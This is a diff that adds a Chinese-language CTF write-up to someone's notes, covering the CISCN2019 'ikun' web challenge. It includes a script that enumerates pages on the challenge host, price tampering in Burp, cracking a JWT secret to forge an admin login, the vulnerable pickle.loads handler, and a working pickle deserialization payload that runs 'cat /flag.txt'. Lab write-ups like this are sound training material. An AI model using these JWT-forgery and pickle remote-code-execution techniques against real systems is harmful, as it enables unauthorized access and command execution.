@@ -3245,3 +3245,102 @@ url解码之后就是 `?code=phpinfo();`
 6. 爆破脚本
    
    [sqli_blind.py](./sqli_blind.py)
+
+## CISCN2019 华北赛区 Day1 Web2 ikun(JWT python反序列化)
+
+1. 进来看到提示购买lv6，直接翻页找不到,翻页时发现url里有页面索引,直接脚本跑
+
+    ```python
+    url = 'http://4a471f3e-6f7e-46ab-a7b3-0dec29398943.node5.buuoj.cn:81/shop?page='
+    for i in range(600):
+        urls = url + str(i)
+        res = requests.get(urls)
+        if 'lv6.png' in res.text:
+            print('lv6 in ' + str(i) +' page\n')
+            break
+    ```
+
+2. lv6在181页，注册账号购买，钱不够，bp抓包，发现有折扣信息，修改折扣
+3. 进入一个新的页面`/b1g_m4mber`,提示只能由admin访问，抓包发现请求头里面有JWT(JSON Web Token,用于身份认证)，用`c-jwt-cracker`破解密钥
+    ```bash
+    ./jwtcrack 密文
+    ```
+
+    得到密钥后，需要生成新的jwt，这时可以用brup的JSON Web Token(修改JWT之后，会自动修改抓取数据包中的JWT),将用户名改为admin，放行，成功访问，查看网页源码发现了压缩包
+
+4. 题目一开始也提示了python 和 pickle，即python的反序列化漏洞，
+   
+   关于pickle
+
+    ```text
+    1. 持续化模块：就是让数据持久化保存。
+
+    pickle模块是Python专用的持久化模块，可以持久化包括自定义类在内的各种数据，比较适合Python本身复杂数据的存贮。
+    但是持久化后的字串是不可认读的，并且只能用于Python环境，不能用作与其它语言进行数据交换。
+
+    2. pickle 模块的作用
+
+    把 Python 对象直接保存到文件里，而不需要先把它们转化为字符串再保存，也不需要用底层的文件访问操作，直接把它们写入到一个二进制文件里。pickle 模块会创建一个 Python 语言专用的二进制格式，不需要使用者考虑任何文件细节，它会帮你完成读写对象操作。用pickle比你打开文件、转换数据格式并写入这样的操作要节省不少代码行。
+
+    3. 主要方法
+    在pickle中dumps()和loads()操作的是bytes类型，而在使用dump()和lload()读写文件时，要使用rb或wb模式，也就是只接收bytes类型的数据。
+    dumps(): 写
+    loads(): 读
+    loads() 和 dumps() 操作对象都是string
+    load() 和 dump() 操作对象都是文件
+    ```
+
+    漏洞在admin.py文件中。
+
+    ```python
+    import tornado.web
+    from sshop.base import BaseHandler
+    import pickle
+    import urllib
+
+
+    class AdminHandler(BaseHandler):
+        @tornado.web.authenticated
+        def get(self, *args, **kwargs):
+            if self.current_user == "admin":
+                return self.render('form.html', res='This is Black Technology!', member=0)
+            else:
+                return self.render('no_ass.html')
+
+        @tornado.web.authenticated
+        def post(self, *args, **kwargs):
+            try:
+                become = self.get_argument('become')
+                p = pickle.loads(urllib.unquote(become))
+                return self.render('form.html', res=p, member=1)
+            except:
+                return self.render('form.html', res='This is Black Technology!', member=0)
+    ```
+
+    借用别人的wp：
+    
+    思路是我们构建一个类，类里面的`__reduce__`魔术方法会在该类被反序列化的时候会被调用,而在`__reduce__`方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码.
+
+    破解脚本。
+
+    ```python
+    import pickle
+    import urllib
+    import commands
+    
+    
+    class payload(object):
+        def __reduce__(self):
+            return (commands.getoutput,('cat /flag.txt',))
+            # return(commands.getoutput,('ls /'))
+            # return (eval, ("open('/flag.txt','r').read()",))
+    
+    
+    a = pickle.dumps(payload())
+    a = urllib.quote(a)
+    print(a)
+    ```
+
+    得到payload后，利用bp修改become的值为payload
+
+    *注意 : 每次发送请求都要将jwt中的username改为admin*
